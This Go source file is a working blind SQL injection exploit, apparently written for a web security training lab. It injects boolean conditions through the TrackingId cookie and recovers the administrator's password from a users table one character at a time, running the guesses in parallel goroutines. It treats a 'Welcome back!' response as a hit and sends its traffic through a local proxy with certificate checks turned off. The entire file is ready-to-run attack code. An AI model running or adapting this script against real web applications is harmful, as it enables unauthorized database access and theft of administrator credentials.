package main

import (
	"crypto/tls"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"time"
)

var alphanumerics string = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
var password [20]string
var wg sync.WaitGroup

func main() {

	startTime := time.Now() // Captura o tempo de início

	if len(os.Args)-1 != 3 {
		fmt.Println("Usage:", os.Args[0], "<url> <sessionCookie> <trackingId>")
		fmt.Println("(+) Example:", os.Args[0], "www.example.com nqSneFd1xzfzKsc6YpWXiSsqSpZDrT20 yvpLsSz5wtE68Cze")
	}

	targetUrl := os.Args[1]
	session := os.Args[2]
	tranckingId := os.Args[3]

	// Create a new client
	client := &http.Client{
		Transport: &http.Transport{
			Proxy: http.ProxyURL(&url.URL{
				Scheme: "http",
				Host:   "127.0.0.1:8080",
			}),
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}

	for index_password := 1; index_password <= 20; index_password++ {
		wg.Add(1)
		go exploit(targetUrl, session, tranckingId, index_password, client)
	}

	wg.Wait()

	for _, letter := range password {
		fmt.Print(letter)
	}

	endTime := time.Now()                 // Captura o tempo de fim
	elapsedTime := endTime.Sub(startTime) // Calcula o tempo decorrido
	fmt.Printf("\nTempo de execução: %s\n", elapsedTime)

}

func exploit(targetUrl string, session string, trackingId string, index_password int, client *http.Client) {
	defer wg.Done()

	for _, alphanumeric := range alphanumerics {

		// Set the session cookie
		sessionCookie := fmt.Sprintf("session=%s;", session)
		trackingIdCookie := fmt.Sprintf("TrackingId=%s' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), %d, 1) = '%c;", trackingId, index_password, alphanumeric)
		//fmt.Println(trackingIdCookie)
		cookie := sessionCookie + trackingIdCookie

		// Send the request
		res, err := sendRequest(targetUrl, cookie, client)
		if err != nil {
			fmt.Println("Error sending request:", err)
			return
		}

		// Read the response body
		body, err := io.ReadAll(res.Body)
		if err != nil {
			fmt.Println("Error reading response body:", err)
		}
		bodyString := string(body)

		// Check if the response body contains the string "Welcome back!"
		if strings.Contains(bodyString, "Welcome back!") {
			fmt.Printf("Letra %d = %s\n", index_password, string(alphanumeric))
			password[index_password-1] = string(alphanumeric)
			return
		}

		res.Body.Close()
	}
}

func sendRequest(targetUrl string, cookie string, client *http.Client) (*http.Response, error) {
	req, err := http.NewRequest(http.MethodGet, targetUrl, nil)
	if err != nil {
		fmt.Println("Error creating request:", err)
	}

	req.Header.Set("Cookie", cookie)

	return client.Do(req)
}
